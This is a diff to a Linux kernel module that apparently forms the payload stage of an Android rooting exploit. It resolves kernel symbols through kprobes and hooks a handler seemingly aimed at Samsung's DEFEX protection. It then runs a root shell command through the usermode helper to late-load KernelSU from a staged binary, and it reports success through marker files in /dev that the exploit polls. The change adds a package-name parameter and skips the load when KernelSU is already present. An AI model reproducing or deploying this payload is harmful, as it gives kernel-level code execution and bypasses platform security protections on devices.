@@ -3,6 +3,7 @@
 #include <linux/kmod.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
+#include <linux/moduleparam.h>
 #include <linux/ptrace.h>
 
 MODULE_LICENSE("GPL");
@@ -15,6 +16,11 @@ typedef int (*umh_exec_t)(void *info, int wait);
 
 static int soft_reboot;
 module_param(soft_reboot, int, 0);
+
+/* The exploit stages the installed manager's ksud at this path and passes the
+ * package name through insmod, so the late-load call matches the manager. */
+static char package_name[64] = "me.weishu.kernelsu";
+module_param_string(package_name, package_name, sizeof(package_name), 0);
 
 static int defex_pre_handler(struct kprobe *p, struct pt_regs *regs)
 {
@@ -38,13 +44,23 @@ static int __nocfi __init dirtyfrag_init(void)
 
     static const char sh[]   = "/system/bin/sh";
     static const char ksud[] = "/data/user_de/0/df.root/ksud";
-    static char cmd[256];
+    static char cmd[512];
     static char *envp[] = { "PATH=/system/bin", NULL };
     static char *argv[] = { (char *)sh, "-c", cmd, NULL };
-    snprintf(cmd, sizeof(cmd),
-             "%s late-load --package-name me.weishu.kernelsu --ro-partitions%s"
-             " && touch /dev/dfm0 || touch /dev/dfm1",
-             ksud, soft_reboot ? " --soft-reboot" : "");
+
+    /* Skip the load when kernelsu is already there. Report through the markers
+     * the exploit polls for, so an already-loaded module still reads as success. */
+    if (soft_reboot)
+        snprintf(cmd, sizeof(cmd),
+                 "if grep -q '^kernelsu ' /proc/modules; then touch /dev/dfm0; exit 0; fi; "
+                 "%s late-load --package-name %s || { touch /dev/dfm1; exit 1; }; "
+                 "touch /dev/dfm0; %s soft-reboot",
+                 ksud, package_name, ksud);
+    else
+        snprintf(cmd, sizeof(cmd),
+                 "if grep -q '^kernelsu ' /proc/modules; then touch /dev/dfm0; exit 0; fi; "
+                 "%s late-load --package-name %s && touch /dev/dfm0 || touch /dev/dfm1",
+                 ksud, package_name);
 
     kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
     if (register_kprobe(&kln_kp) < 0) {
